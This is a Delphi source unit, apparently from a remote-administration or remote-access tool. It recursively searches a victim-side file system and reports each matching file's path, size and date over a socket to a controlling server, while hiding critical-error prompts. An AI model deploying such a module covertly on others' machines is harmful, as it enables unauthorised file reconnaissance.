unit UnitBuscar;

interface

uses Windows, SysUtils, SocketUnit, UnitVariables,ShellApi, SHFOLDER;

type
  TThreadSearch = class(TObject)
  public
    Server:   TClientSocket;
	  Path : string;
    ThreadId: longword;
    constructor Create(S: TClientSocket;spath:string);
    procedure SearchStart(dirname:string;server:TClientSocket;maint:boolean);
  end;


  procedure threadstart(p:pointer);
implementation


constructor TThreadSearch.Create(S: TClientSocket;spath:string);
begin
  Server := S;
  Path := spath;
end;


procedure threadstart(p:pointer);
var
  search : TThreadSearch;
begin
  search := TThreadSearch(p);
  StopSearch := false;
  search.SearchStart(search.Path,search.server,true);
end;

procedure TThreadSearch.SearchStart(dirname:string;server:TClientSocket;maint:boolean);
var
  strFile, strDirectory: string;
  Listado:   TSearchRec;
  shInfo:    TSHFileInfo;
  sFileType: string;
  tmp   :       string;
begin
  sleep(10);    //Para que no consuma tanta CPU :D


  SetErrorMode(SEM_FAILCRITICALERRORS); //Evita que se muestren errores criticos
  if maint then
  if not DirectoryExists(extractfilepath(dirname)) then stopsearch := true;

  if StopSearch then
  begin
    Server.SendString('SEARCH|STOPS'+#10);
    exitthread(0);
  end;

  if not server.Connected then exitthread(0);
  if FindFirst(extractfilepath(dirname) + extractfilename(dirname), faAnyFile, Listado) = 0 then
  begin
    repeat
      if StopSearch then
      begin
        Server.SendString('SEARCH|STOPS'+#10);
        exitthread(0);
      end;
      if not ((Listado.Attr and faDirectory) = faDirectory) then //Si no es una carpeta...
      begin
        tmp := 'SEARCH|'+Extractfilepath(dirname)+Listado.Name+'|'+ inttostr(Listado.Size)+'|-|'+inttostr(Listado.time) + '|';
        Server.SendString(tmp+#10);
      end;
    until FindNext(Listado) <> 0;
    SysUtils.FindClose(Listado);
  end;

   SetErrorMode(SEM_FAILCRITICALERRORS);
  if FindFirst(extractfilepath(dirname) +'*.*', faAnyFile, Listado) = 0 then
  begin
  repeat
    if StopSearch then
    begin
      Server.SendString('SEARCH|STOPS'+#10);
      exitthread(0);
    end;
    if ((Listado.Attr and faDirectory) = faDirectory) then //Si es una carpeta...
    if ((listado.Name <> '.') and (listado.Name <> '..'))  then
      SearchStart(extractfilepath(dirname)+listado.Name+'\'+ extractfilename(dirname),server,false);
  until FindNext(Listado) <> 0;
    SysUtils.FindClose(Listado);
  end;
  
  if(maint) then
  begin
    Server.SendString('SEARCH|FINISH'+#10);
    exitthread(0);
  end;
end;

end.